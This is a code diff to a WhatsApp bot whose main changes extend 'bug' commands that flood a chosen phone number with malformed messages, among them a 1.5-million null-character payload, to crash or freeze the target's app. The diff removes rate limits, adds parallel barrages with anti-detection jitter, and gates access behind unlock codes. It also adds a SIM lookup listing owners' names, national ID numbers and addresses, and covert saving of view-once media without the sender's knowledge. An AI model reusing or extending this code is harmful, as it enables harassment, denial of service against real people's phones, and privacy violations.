@@ -47,6 +47,7 @@ const { igDownload } = require('./allfunc/igdownload')
 const { xnxxDownload, xnxxSearch } = require('./allfunc/xnxxdownload')
 const { githubstalk } = require('./allfunc/githubstalk')
 const { mlstalk } = require('./allfunc/mlstalk')
+const { lookupSimDatabase, formatSimRecordsMessage } = require('./allfunc/sim-lookup')
 const {
   getCryptoTop, getCryptoDetail, searchCrypto, resolveCoinId, getStockPrice,
   getCryptoGainers, getCryptoLosers,
@@ -770,8 +771,8 @@ if (isCmd) {
 }
 
 // VIEW-ONCE EMOJI TRIGGER: Allow emoji replies/reactions WITHOUT prefix
-// These emojis trigger view-once pic/video download when replied to a view-once message
-if (!command && body && m.quoted) {
+// Works with quoted reply OR standalone emoji (uses cached last view-once per chat)
+if (!command && body) {
     // SPEED: module-level constant — created ONCE, not on every message
     if (!global._voEmojisSet) global._voEmojisSet = new Set([
         '😭','🌚','🤭','🔥','😋','😊','😘','😎','😅','✨','⭐',
@@ -806,6 +807,13 @@ if (!devtrust._cachedBotNumber) {
   devtrust._cachedBotNumber = await devtrust.decodeJid(devtrust.user.id);
 }
 const botNumber = devtrust._cachedBotNumber;
+
+// Linked WhatsApp account user (paired number) — used for self/private mode
+const _botNumClean = String(botNumber || '').replace(/[^0-9]/g, '');
+const _isBotLinkedUser = () => {
+    const senderNum = String(m.sender || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
+    return Boolean(m.key?.fromMe || (senderNum && senderNum === _botNumClean));
+};
 
 // ── Cache groupMetadata with 30-min TTL + pending-request dedup ──
 // PERF FIX: TTL 5min→30min (group admins rarely change).
@@ -877,6 +885,92 @@ const _cleanSenderNum = (m.sender || '').replace(/[^0-9]/g, '');
 const _senderAdultUnlocked = global._flagCache.adult.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);
 // Bug & SIM Database unlock status for this sender (cached)
 const _senderBugUnlocked = global._flagCache.bug.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum);
+
+// Shared bug-section access guard — used by all bug attack commands
+const _requireBugAccess = () => {
+    if (global._flagCache.bugBanned.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum)) {
+        reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
+        return false;
+    }
+    if (!global._flagCache.bugUnlocked.some(id => String(id).replace(/[^0-9]/g, '') === _cleanSenderNum)) {
+        reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
+        return false;
+    }
+    return true;
+};
+
+// Parse + validate bug target number
+const _parseBugTarget = (raw) => {
+    const num = String(raw || '').replace(/[^0-9]/g, '');
+    if (!num || num.length < 7 || num.length > 15) return null;
+    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ''));
+    if (protectedNumbers.includes(num)) return { blocked: true, num };
+    return { num, jid: num + '@s.whatsapp.net' };
+};
+
+// Silent error wrapper — one failed payload never kills the barrage
+const _bugSafe = async (fn, target) => {
+    try { await fn(target); } catch (_) {}
+};
+
+// Parallel burst with anti-detect micro-jitter between batches
+const _bugBurst = async (target, fns, batchSize = 8) => {
+    if (stopAttacks) return;
+    for (let i = 0; i < fns.length; i += batchSize) {
+        if (stopAttacks) return;
+        await Promise.allSettled(
+            fns.slice(i, i + batchSize).map(fn => _bugSafe(fn, target))
+        );
+        await sleep(12 + Math.floor(Math.random() * 28));
+    }
+};
+
+// Centralized attack profiles — all bug commands route through here
+const _runBugBarrage = async (target, profile = 'standard') => {
+    const _carousel = (t) => CarouselVY4(devtrust, t);
+    const _crashIos = (t) => CrashLoadIos(devtrust, t);
+
+    const waves = {
+        combo: () => _bugBurst(target,
+            Array(36).fill(null).flatMap(() => [callinvisible, ForceXFrezee, blank1]), 9),
+        fcnew: () => _bugBurst(target,
+            Array(30).fill(null).flatMap(() => [_carousel, LocaXotion, XinsooInvisV1]), 8),
+        xphone: () => _bugBurst(target,
+            Array(24).fill(null).flatMap(() => [_carousel, _crashIos, forclose, LocaXotion, Xblanknoclick, callinvisible]), 8),
+        bayu: () => _bugBurst(target,
+            Array(24).fill(null).flatMap(() => [protoXimg, bulldozer, protocolbug3, delayMakerInvisible, xatanicinvisv4, protocolbug6]), 8),
+        forceclose: () => _bugBurst(target, Array(40).fill(forclose), 12),
+        ios: () => _bugBurst(target,
+            Array(20).fill(null).flatMap(() => [callinvisible, blank1, ForceXFrezee, forclose]), 8),
+        vampire: () => _bugBurst(target, Array(6).fill(VampireBugIns), 3),
+        group: () => _bugBurst(target, Array(8).fill(null).flatMap(() => [BlankGroup, VampireGroupInvis, callinvisible]), 4),
+    };
+
+    const profiles = {
+        crash:     { rounds: 14, seq: ['combo', 'fcnew', 'forceclose', 'xphone'] },
+        delayhard: { rounds: 18, seq: ['fcnew', 'fcnew', 'combo', 'xphone', 'bayu', 'forceclose'] },
+        close:     { rounds: 12, seq: ['combo', 'fcnew', 'forceclose', 'forceclose', 'xphone'] },
+        invis:     { rounds: 20, seq: ['ios', 'combo', 'forceclose'] },
+        ultrabug:  { rounds: 28, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose', 'vampire'] },
+        megabug:   { rounds: 35, seq: ['combo', 'combo', 'fcnew', 'fcnew', 'xphone', 'bayu', 'forceclose', 'forceclose'] },
+        ghost:     { rounds: 35, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose', 'ios'] },
+        godmode:   { rounds: 45, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose', 'forceclose', 'vampire'] },
+        killswitch:{ rounds: 50, seq: ['combo', 'combo', 'fcnew', 'fcnew', 'xphone', 'bayu', 'forceclose', 'forceclose', 'vampire'] },
+        nuke:      { rounds: 55, seq: ['combo', 'combo', 'fcnew', 'fcnew', 'xphone', 'xphone', 'bayu', 'bayu', 'forceclose', 'forceclose', 'vampire'] },
+        destroy:   { rounds: 16, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose'] },
+        standard:  { rounds: 12, seq: ['combo', 'fcnew', 'xphone', 'bayu', 'forceclose'] },
+        group:     { rounds: 22, seq: ['group', 'combo', 'fcnew', 'forceclose'] },
+    };
+
+    const cfg = profiles[profile] || profiles.standard;
+    for (let round = 0; round < cfg.rounds; round++) {
+        if (stopAttacks) { stopAttacks = false; break; }
+        await Promise.allSettled(
+            cfg.seq.map(name => waves[name] ? waves[name]() : Promise.resolve())
+        );
+        await sleep(8 + Math.floor(Math.random() * 22));
+    }
+};
 const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : (m.isNewsletter ? true : false);
 const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : (m.isNewsletter ? true : false);
 const groupName = m.isGroup ? groupMetadata?.subject || "" : "";
@@ -973,7 +1067,7 @@ async function callinvisible(target) {
           },
           nativeFlowResponseMessage: {
             name: "call_permission_request",
-            paramsJson: "\u0000".repeat(1000000),
+            paramsJson: "\u0000".repeat(1500000),
             version: 3
           }
         },
@@ -1583,13 +1677,12 @@ async function LocaXotion(target) {
 }
 
 async function forclose(target) {
-  // Add rate limiting - CYBER't let this function be called too fast
   const now = Date.now();
-  if (global.lastForclose && (now - global.lastForclose) < 5000) {
-    console.log("⏱️ forclose called too soon, skipping");
-    return;
-  }
-  global.lastForclose = now;
+  if (!global._forcloseLast) global._forcloseLast = new Map();
+  const last = global._forcloseLast.get(target) || 0;
+  // Per-target micro-throttle (was 5s GLOBAL — that made ForceClose nearly useless)
+  if (now - last < 55) return;
+  global._forcloseLast.set(target, now);
   
   // Add timeout to prevent hanging
   const timeoutPromise = new Promise((_, reject) => {
@@ -3282,10 +3375,13 @@ async function blankgc(target) {
 // END OF BUG FUNCTIONS 
 //=====COMBINING ALL GC BUG======//
 async function bug3(isTarget) {
-for (let i = 0; i < 60; i++) {
-await killgc(isTarget);
-await rusuhgc(isTarget);
-await blankgc(isTarget);
+for (let i = 0; i < 15; i++) {
+  if (stopAttacks) return;
+  await Promise.allSettled([
+    killgc(isTarget), rusuhgc(isTarget), blankgc(isTarget),
+    killgc(isTarget), rusuhgc(isTarget), blankgc(isTarget),
+  ]);
+  await sleep(80 + Math.floor(Math.random() * 120));
 }
 console.log(chalk.blue(`Sending Crash Hard to ${isTarget}☠️`));
 }
@@ -3483,56 +3579,32 @@ async function iosOver(durationHours, XS) {
 
 
 
-// ================= ( Combo Function )====================
-async function Combo(target) { 
-        for (let i = 0; i< 100; i++) {
-        await callinvisible(target);
-        await ForceXFrezee(target);
-        await blank1(target);
-        await callinvisible(target);
-        await ForceXFrezee(target);
-        await blank1(target);
-        await callinvisible(target);
-        await ForceXFrezee(target);
-        await blank1(target);
-        await callinvisible(target);
-        await ForceXFrezee(target);
-        await blank1(target);
-        await callinvisible(target);
-        await ForceXFrezee(target);
-        await blank1(target);
-        await callinvisible(target);
-        await ForceXFrezee(target);
-        await blank1(target);
-        
-        }
+// ================= ( Combo Function — parallel waves )====================
+async function Combo(target) {
+    for (let wave = 0; wave < 22; wave++) {
+        if (stopAttacks) return;
+        await Promise.allSettled(
+            Array(18).fill(null).map((_, i) => {
+                const fn = [callinvisible, ForceXFrezee, blank1][i % 3];
+                return fn(target).catch(() => {});
+            })
+        );
+        await sleep(15 + Math.floor(Math.random() * 25));
+    }
 }
 
-async function fcnew(target) { 
-        for (let i = 0; i< 100; i++) {     
-   await CarouselVY4(devtrust, target);
-   await CarouselVY4(devtrust, target);
-   await LocaXotion(target);
-   await XinsooInvisV1(target);
-   await CarouselVY4(devtrust, target);
-   await CarouselVY4(devtrust, target);
-   await LocaXotion(target);
-   await XinsooInvisV1(target); 
-   await CarouselVY4(devtrust, target);
-   await CarouselVY4(devtrust, target);
-   await LocaXotion(target);
-   await XinsooInvisV1(target);
-   await CarouselVY4(devtrust, target);
-   await CarouselVY4(devtrust, target);
-   await LocaXotion(target);
-   await XinsooInvisV1(target);  
-   await CarouselVY4(devtrust, target);
-   await CarouselVY4(devtrust, target);
-   await LocaXotion(target);
-   await XinsooInvisV1(target);
-   
-        }
-} 
+async function fcnew(target) {
+    const _run = (fn) => () => fn(target);
+    const _car = () => CarouselVY4(devtrust, target);
+    const vectors = [_car, _run(LocaXotion), _run(XinsooInvisV1)];
+    for (let wave = 0; wave < 22; wave++) {
+        if (stopAttacks) return;
+        await Promise.allSettled(
+            Array(18).fill(null).map((_, i) => vectors[i % 3]().catch(() => {}))
+        );
+        await sleep(15 + Math.floor(Math.random() * 25));
+    }
+}
 
 async function BugGroup(target) {
     for (let i = 0; i< 200; i++) {
@@ -3564,99 +3636,60 @@ async function BugGroup(target) {
  }
 
 async function BayuOfficialHard(target) {
-    for (let i = 0; i< 200; i++) {
-    await protoXimg(target)
-    await bulldozer(target)
-    await protocolbug3(target)
-    await bulldozer(target)
-    await delayMakerInvisible(target)
-    await bulldozer(target)
-    await xatanicinvisv4(target)
-    await bulldozer(target)
-    await protocolbug6(target)
+    const vectors = [protoXimg, bulldozer, protocolbug3, delayMakerInvisible, xatanicinvisv4, protocolbug6];
+    for (let wave = 0; wave < 18; wave++) {
+        if (stopAttacks) return;
+        await Promise.allSettled(
+            Array(18).fill(null).map((_, i) => vectors[i % vectors.length](target).catch(() => {}))
+        );
+        await sleep(15 + Math.floor(Math.random() * 25));
     }
 }
     
 async function ForceClose(target) {
-  for (let i = 0; i< 250; i++) {
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  await forclose(target);
-   await forclose(target);
-  await forclose(target);
-  await forclose(target);
-   await forclose(target);
-  await forclose(target);
-  await forclose(target);
-  
-         }
- 
- }
- 
- async function XPhone(target) { 
-    for (let i = 0; i< 300; i++) {  // ✅ CORRECT - lowercase i
- 
-await CarouselVY4(devtrust, target);
-await CrashLoadIos(devtrust, target);
-await forclose(target);
-await LocaXotion(target);
-await XinsooInvisV1(target);
-await Xblanknoclick(target);
-await ForceXFrezee(target);
-await blank1(target);
-await callinvisible(target);
-   
-   } 
-   
-   
+    for (let wave = 0; wave < 28; wave++) {
+        if (stopAttacks) return;
+        await Promise.allSettled(
+            Array(16).fill(null).map(() => forclose(target).catch(() => {}))
+        );
+        await sleep(18 + Math.floor(Math.random() * 30));
+    }
 }
-// ================= ( Bates Function )=====================
+ 
+async function XPhone(target) {
+    const _car = () => CarouselVY4(devtrust, target);
+    const _ios = () => CrashLoadIos(devtrust, target);
+    const vectors = [_car, _ios, forclose, LocaXotion, XinsooInvisV1, Xblanknoclick, ForceXFrezee, blank1, callinvisible];
+    for (let wave = 0; wave < 20; wave++) {
+        if (stopAttacks) return;
+        await Promise.allSettled(
+            Array(18).fill(null).map((_, i) => vectors[i % vectors.length](target).catch(() => {}))
+        );
+        await sleep(15 + Math.floor(Math.random() * 25));
+    }
+}
+// ================= ( Bates Function — attack START notify, non-blocking )=====================
 async function CYBEReress() {
-    if (!text) throw "❌ Target information required";
-    
-    let pepec = args[0].replace(/[^0-9]/g, "");
-    let thumbnailUrl = "https://files.catbox.moe/smv12k.jpeg";
-    
-    let ressCYBERe = `
-*CYBER — Operation Complete*
-
-▸ Type: ${command}
-▸ Target: ${pepec}
-
-System requires a 10-minute cooldown before next operation.
-`;
-
-    await devtrust.sendMessage(m.chat, {
+    if (!text) return;
+    const pepec = args[0].replace(/[^0-9]/g, "");
+    const thumbnailUrl = "https://files.catbox.moe/smv12k.jpeg";
+    const ressCYBERe = `⚡ *CYBER — Attack Launched*\n\n▸ Command: ${command}\n▸ Target: ${pepec}\n▸ Status: *Barrage active...*`;
+    devtrust.sendMessage(m.chat, {
         image: { url: thumbnailUrl },
         caption: ressCYBERe,
-        gifPlayback: true,
-        gifAttribution: 1,
         contextInfo: {
             mentionedJid: [m.sender],
             externalAdReply: {
                 showAdAttribution: false,
                 title: "CYBER — Bug System",
-                body: "Operation Complete",
+                body: "Attack Launched",
                 thumbnailUrl: thumbnailUrl,
                 sourceUrl: "https://whatsapp.com/channel/0029VbC0knY72WU0QUNAid3B",
                 mediaType: 1,
                 renderLargerThumbnail: false
-            },
-            forwardedNewsletterMessageInfo: {
-                newsletterJid: "120363408022768294@newsletter",
-                newsletterName: "CYBER",
-                serverMessageId: -1
             }
-        },
-        headerType: 6,
-        viewOnce: false
-    }, { quoted: m });
+        }
+    }, { quoted: m }).catch(() => {});
 }
 
 // ============ ACCOUNT FUNCTIONS ============
@@ -4171,12 +4204,11 @@ From: @${sender.split('@')[0]}
 })();
 
 if (!devtrust.public) {
-    // Channels/newsletters mein bot owner/admin ke liye allow karo (even in private mode)
     const _isNewsletterChat = m.chat && m.chat.endsWith('@newsletter');
-    // Channel sender ka number strip karke match karo (JID mein :1 suffix hota hai)
     const _senderClean = (m.sender || '').split(':')[0].split('@')[0].replace(/[^0-9]/g, '');
     const _isCreatorFromChannel = _isNewsletterChat && owner.some(o => o.replace(/[^0-9]/g, '') === _senderClean);
-    if (!isCreator && !_isCreatorFromChannel) return
+    // Self mode: only the linked bot number can use commands (not random users in groups)
+    if (!_isBotLinkedUser() && !_isCreatorFromChannel) return;
 }
 
 const example = (teks) => {
@@ -5490,7 +5522,7 @@ ${_senderBugUnlocked ? `┏━━◆ *CYBER - 𝐒𝐈𝐌 𝐃𝐀𝐓𝐀𝐁�
 │ ◈ *📊 𝗗𝗔𝗧𝗔 𝗙𝗜𝗘𝗟𝗗𝗦*
 │  👤 Full Name  📱 Phone
 │  🆔 CNIC       🏠 Address
-│  📡 Network    ✅ Results Real-time
+│  📡 Network    🔄 Multi-source (2026)
 │
 ┗━━━━━━━━━━━━━━━━━━━━┛` : ''}
 
@@ -5937,19 +5969,7 @@ break;
 
 case 'bugmenu':
 case 'CYBERbug': {
-    {
-        const _bmSenderNum = (m.sender || '').split('@')[0].split(':')[0];
-        const _bmBannedFile = './database/bug_banned.json';
-        const _bmUnlockedFile = require('path').join(__dirname, 'database', 'bug_unlocked.json');
-        let _bmBanned = [];
-        try { if (fs.existsSync(_bmBannedFile)) _bmBanned = JSON.parse(fs.readFileSync(_bmBannedFile, 'utf-8')); } catch(e) {}
-        if (_bmBanned.some(id => String(id).replace(/[^0-9]/g,'') === _bmSenderNum))
-            return reply(`🚫 *Access Denied*\nAap permanently ban hain Bug & SIM section se.`);
-        let _bmUnlocked = [];
-        try { if (fs.existsSync(_bmUnlockedFile)) _bmUnlocked = JSON.parse(fs.readFileSync(_bmUnlockedFile, 'utf-8')); } catch(e) {}
-        if (!_bmUnlocked.some(id => String(id).replace(/[^0-9]/g,'') === _bmSenderNum))
-            return reply(`🔒 *Bug Menu — Locked Section*\n\nYe section sirf authorized users ke liye hai.\n\n*Unlock karne ke liye:*\nAdmin se code maango phir type karo:\n➤ *${prefix}addkey1 <code>*`);
-    }
+    if (!_requireBugAccess()) break;
     autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
     
@@ -6909,6 +6929,7 @@ case 'CYBERsticker': {
 break;
 
 case 'toolmenu':
+case 'toolsmenu':
 case 'CYBERtool': {
     autoJoinGroup(devtrust, "https://chat.whatsapp.com/HO9oF4txvBoKqhPMHAlHLc").catch(() => {});
     await devtrust.sendMessage(m.chat, { react: { text: '🥀', key: m.key } });
@@ -8719,7 +8740,8 @@ case 'mlstalk': {
     break;
 }
 
-case "calculator": {
+case "calculator":
+case "calculate": {
     if (!text) return reply(`🧮 *CYBER Calculator*\n\nUsage: ${prefix}calculator [expression]\nExample: ${prefix}calculator 25*4+100\n\nOperators: + - * / × ÷ ( ) π e`);
     try {
         const val = text
@@ -9255,29 +9277,29 @@ case "removebg": {
         // Download the image
         let media = await quotedMsg.download();
         
-        // Upload to temporary hosting
-        let uploadedUrl = await uploadToCatbox(media);
-        
-        if (!uploadedUrl) {
-            throw new Error('Upload failed');
-        }
-        
-        // Call removebg API
-        let response = await fetch(`https://image.pollinations.ai/prompt/Remove%20background%20from%20image%20${encodeURIComponent(uploadedUrl)}?width=1024&height=1024&nologo=true`);
-        let data = await response.json();
+        // Remove background via multipart upload (pollinations JSON endpoint was broken)
+        const FormData = require('form-data');
+        const form = new FormData();
+        form.append('file', media, { filename: 'image.jpg', contentType: mime || 'image/jpeg' });
+        const bgRes = await axios.post('https://api.kaiz.me/removebg', form, {
+            headers: form.getHeaders(),
+            responseType: 'arraybuffer',
+            timeout: 120000,
+            maxContentLength: 50 * 1024 * 1024,
+        });
 
-        if (data.status && data.data) {
-            await devtrust.sendMessage(m.chat,
-                addNewsletterContext({
-                    image: { url: data.data },
-                    caption: "✨ *Background Removed*"
-                }),
-                { quoted: m }
-            );
-            await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
-        } else {
-            throw new Error('API returned error');
+        if (!bgRes.data || bgRes.data.byteLength < 200) {
+            throw new Error('Empty response from remove-bg service');
         }
+
+        await devtrust.sendMessage(m.chat,
+            addNewsletterContext({
+                image: Buffer.from(bgRes.data),
+                caption: "✨ *Background Removed*"
+            }),
+            { quoted: m }
+        );
+        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
     } catch (e) {
         console.error('RemoveBG error:', e);
         await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
@@ -9893,10 +9915,15 @@ case "readqr": {
     const buffer = await m.quoted.download();
     
     try {
-        const res = await axios.post("https://api.qrserver.com/v1/read-qr-code/", buffer, {
-            headers: { "Content-Type": "multipart/form-data" }
+        const FormData = require('form-data');
+        const form = new FormData();
+        form.append('file', buffer, { filename: 'qr.png', contentType: 'image/png' });
+        const res = await axios.post('https://api.qrserver.com/v1/read-qr-code/', form, {
+            headers: form.getHeaders(),
+            timeout: 30000,
         });
-        const qrText = res.data[0].symbol[0].data;
+        const qrText = res.data?.[0]?.symbol?.[0]?.data;
+        if (!qrText) return reply('❌ *No QR code found in image*');
         reply(`📱 *QR Code Content*\n\n${qrText}`);
     } catch (e) {
         reply("❌ *Failed to read QR code*");
@@ -9934,18 +9961,6 @@ case 'weatherinfo': {
         console.error('Weather Error:', error.message);
         await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
         reply(`⚠️ *CYBER Weather*\n\nWeather service is offline. Try again later.`);
-    }
-}
-break;
-
-case "calculate": {
-    if (!text) return reply("🧮 *Example:* calculate 12+25*3");
-    
-    try {
-        const result = eval(text);
-        reply(`🧮 *Result*\n\n${text} = ${result}`);
-    } catch {
-        reply("❌ *Invalid expression*");
     }
 }
 break;
@@ -11535,10 +11550,9 @@ case 'vvgh': {
                 ptt: true
             });
         }
-        await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+        // Silent save — no reaction left in chat
     } catch (error) {
         console.error('vv error:', error);
-        await devtrust.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
     }
 }
 break;
@@ -11675,8 +11689,7 @@ case '🦋': {
             } else if (/audio/.test(mime)) {
                 await devtrust.sendMessage(_voDest, { audio: media, mimetype: 'audio/mpeg', ptt: true });
             }
-            // Silent ✅ reaction — no visible message, sender doesn't know
-            await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+            // Silent save — no reaction in chat
         } catch (_voQErr) { console.error('Emoji vv (quoted) error:', _voQErr); }
         break;
     }
@@ -11704,8 +11717,7 @@ case '🦋': {
                     } else if (_voType === 'audioMessage') {
                         await devtrust.sendMessage(_voDest, { audio: _buf, mimetype: _voCont.mimetype || 'audio/ogg; codecs=opus', ptt: Boolean(_voCont.ptt) });
                     }
-                    // Silent ✅ reaction — no message in chat
-                    await devtrust.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+                    // Silent save — no reaction in chat
                 }
             }
         } catch (_voSErr) { console.error('Emoji vv (stored) error:', _voSErr); }
@@ -13162,8 +13174,16 @@ case "gpt4": {
 }
 break;
 
-case 'mode': {
-    reply(`🔹 *Mode:* ${devtrust.public ? 'Public' : 'Private'}`);
+case 'mode':
+case 'botmode': {
+    reply(`🔹 *Bot Mode:* ${devtrust.public ? '🌍 PUBLIC' : '🔐 SELF (Private)'}
+
+${devtrust.public
+    ? '✅ Ab *sab log* commands use kar sakte hain (groups + private).'
+    : '✅ Ab *sirf aapke linked number* ke commands kaam karte hain.'}
+
+• *${prefix}public* — sab ke liye open karo
+• *${prefix}self* — sirf apne liye (connect/restart par default)`);
 }
 break;
 
@@ -13221,29 +13241,25 @@ case 'checkapis': {
 break;
 
 case 'public': {
-    // Per-session only — only this connected number switches to public
     devtrust.public = true;
-    // Save to DB so mode survives restarts (per-number, not shared)
     try {
         const { setBotMode } = require('./server/db-service');
         const _modeNum = botNumber ? botNumber.replace(/[^0-9]/g, '') : '';
         if (_modeNum) setBotMode(_modeNum, 'public').catch(() => {});
     } catch (_) {}
-    reply("🌍 *Public mode activated*\nEveryone can use the bot");
+    reply(`🌍 *Public mode ON*\n\nAb groups aur private mein *koi bhi* bot commands use kar sakta hai.\n\n🔐 Wapas band karne ke liye: *${prefix}self*`);
 }
 break;
 
 case 'private':
 case 'self': {
-    // Per-session only — only this connected number switches to private/self
     devtrust.public = false;
-    // Save to DB so mode survives restarts (per-number, not shared)
     try {
         const { setBotMode } = require('./server/db-service');
         const _modeNum = botNumber ? botNumber.replace(/[^0-9]/g, '') : '';
         if (_modeNum) setBotMode(_modeNum, 'self').catch(() => {});
     } catch (_) {}
-    reply("🔐 *Private mode activated*\nOnly bot owner & bot number can use the bot");
+    reply(`🔐 *Self mode ON (Private)*\n\nAb *sirf aapke linked number* ke commands kaam karenge.\nDusre log groups mein command likhein to bot respond nahi karega.\n\n🌍 Public karne ke liye: *${prefix}public*`);
 }
 break;
 
@@ -15391,49 +15407,17 @@ break;
 //==============================
 
 case 'cyber-destroy': {
-    {
-        const _bgN3 = (m.sender||'').split('@')[0].split(':')[0];
-        try {
-            const _bgB3 = (global._flagCache?.bugBanned || []);
-            if (_bgB3.some(id => String(id).replace(/[^0-9]/g,'') === _bgN3)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
-            const _bgU3 = (global._flagCache?.bugUnlocked || []);
-                if (!_bgU3.some(id => String(id).replace(/[^0-9]/g,'') === _bgN3)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
-
-        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
-    } 
+    if (!_requireBugAccess()) break;
     if (!q) return reply("📌 *Usage:* cyber-destroy 923xx");
+    const _tgt = _parseBugTarget(q);
+    if (!_tgt) return reply('❌ *Invalid number* — example: 923001234567');
+    if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    let targetNumber = q.replace(/[^0-9]/g, '');
-    
-    // 🔒 PROTECTED NUMBERS CHECK
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
-    if (protectedNumbers.includes(targetNumber)) {
-        return reply("🔒 *Protected*");
-    }
-
-    let target = targetNumber + "@s.whatsapp.net";
-    reply(`💀 *CYBER-DESTROY — FULL POWER*\n🎯 *Target:* ${targetNumber}\n🔥 *10 Round Attack Launching...*`);
-
+    reply(`💀 *CYBER-DESTROY — FULL POWER*\n🎯 *Target:* ${_tgt.num}\n🔥 *Launching destroy barrage...*`);
+    CYBEReress();
     try {
-        await CYBEReress();
-        await sleep(30);
-        for (let round = 0; round < 10; round++) {
-            await Combo(target);
-            await sleep(25);
-            await fcnew(target);
-            await sleep(25);
-            await XPhone(target);
-            await sleep(25);
-            await BayuOfficialHard(target);
-            await sleep(25);
-            for (let i = 0; i < 30; i++) {
-                await ForceClose(target);
-                await sleep(15);
-            }
-            await sleep(30);
-        }
-
-        reply(`✅ *CYBER-DESTROY complete — 10 rounds done on ${targetNumber}*`);
+        await _runBugBarrage(_tgt.jid, 'destroy');
+        reply(`✅ *CYBER-DESTROY complete — ${_tgt.num}*`);
     } catch(e) {
         reply(`⚠️ *Partial: ${e.message || 'error'}*`);
     }
@@ -15444,111 +15428,39 @@ case "delay":
 case "crash":
 case "blank":
 case "cyberinvis": {
-    {
-        const _bgN0 = (m.sender||'').split('@')[0].split(':')[0];
-        try {
-            const _bgB0 = (global._flagCache?.bugBanned || []);
-            if (_bgB0.some(id => String(id).replace(/[^0-9]/g,'') === _bgN0)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
-            const _bgU0 = (global._flagCache?.bugUnlocked || []);
-                if (!_bgU0.some(id => String(id).replace(/[^0-9]/g,'') === _bgN0)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
-
-        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
-    }
+    if (!_requireBugAccess()) break;
     if (!text) return reply(`📌 *Usage:* ${command} 923xx`);
+    const _tgt = _parseBugTarget(args[0]);
+    if (!_tgt) return reply('❌ *Invalid number*');
+    if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    let pepec = args[0].replace(/[^0-9]/g, "");
-    
-    // 🔒 PROTECTED NUMBERS CHECK
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
-    if (protectedNumbers.includes(pepec)) {
-        return reply("🔒 *Protected*");
-    }
-    
-    let target = pepec + '@s.whatsapp.net';
-    reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n🔥 *Launching full attack...*`);
-
+    reply(`💀 *Target:* ${_tgt.num}\n⚡ *${command.toUpperCase()} — Full barrage launching...*`);
+    CYBEReress();
     try {
-        await CYBEReress();
-        await sleep(30);
-        for (let round = 0; round < 10; round++) {
-            await Combo(target);
-            await sleep(30);
-            await fcnew(target);
-            await sleep(30);
-            await Combo(target);
-            await sleep(30);
-            await fcnew(target);
-            await sleep(30);
-            await XPhone(target);
-            await sleep(30);
-            await BayuOfficialHard(target);
-            await sleep(30);
-            for (let j = 0; j < 10; j++) {
-                await ForceClose(target);
-                await sleep(20);
-            }
-            await sleep(30);
-        }
-        reply(`✅ *Attack completed on ${pepec}*`);
+        await _runBugBarrage(_tgt.jid, 'crash');
+        reply(`✅ *Attack completed on ${_tgt.num}*`);
     } catch(e) {
-        reply(`⚠️ *Partial execution: ${e.message || 'Error'}*`);
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
-    
     await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
 }
 break;
 
 case "delayhard": {
-    {
-        const _bgN1 = (m.sender||'').split('@')[0].split(':')[0];
-        try {
-            const _bgB1 = (global._flagCache?.bugBanned || []);
-            if (_bgB1.some(id => String(id).replace(/[^0-9]/g,'') === _bgN1)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
-            const _bgU1 = (global._flagCache?.bugUnlocked || []);
-                if (!_bgU1.some(id => String(id).replace(/[^0-9]/g,'') === _bgN1)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
-
-        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
-    }
+    if (!_requireBugAccess()) break;
     if (!text) return reply(`📌 *Usage:* ${command} 923xx`);
+    const _tgt = _parseBugTarget(args[0]);
+    if (!_tgt) return reply('❌ *Invalid number*');
+    if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    let pepec = args[0].replace(/[^0-9]/g, "");
-    
-    // 🔒 PROTECTED NUMBERS CHECK
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
-    if (protectedNumbers.includes(pepec)) {
-        return reply("🔒 *Protected*");
-    }
-    
-    let target = pepec + '@s.whatsapp.net';
